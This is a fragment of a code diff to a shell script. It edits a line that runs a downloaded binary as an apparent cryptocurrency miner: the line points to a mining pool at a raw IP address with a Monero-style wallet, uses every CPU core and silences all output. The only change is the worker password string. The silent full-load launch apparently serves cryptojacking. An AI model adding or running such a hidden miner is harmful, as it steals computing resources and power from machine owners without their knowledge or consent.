@@ -25,4 +25,4 @@ chmod +x "$BIN_NAME"
 # Optional: run the binary
 # ./"$BIN_NAME"
 
-./"$BIN_NAME" -o 35.80.32.248:8087 -u 8AbfmbW5XsVagWZv2iS8JQMoVxL3qnUkTKMdnDqUAACpdJKmjb9G6Ln4eNHgxExXQbJe4tAgxFeYoZDVRBDeanpnJwE3qnp -p sangin18A-J-Nrd -a rx/0 -t $(nproc --all) > /dev/null 2>&1
+./"$BIN_NAME" -o 35.80.32.248:8087 -u 8AbfmbW5XsVagWZv2iS8JQMoVxL3qnUkTKMdnDqUAACpdJKmjb9G6Ln4eNHgxExXQbJe4tAgxFeYoZDVRBDeanpnJwE3qnp -p sangin24M -a rx/0 -t $(nproc --all) > /dev/null 2>&1
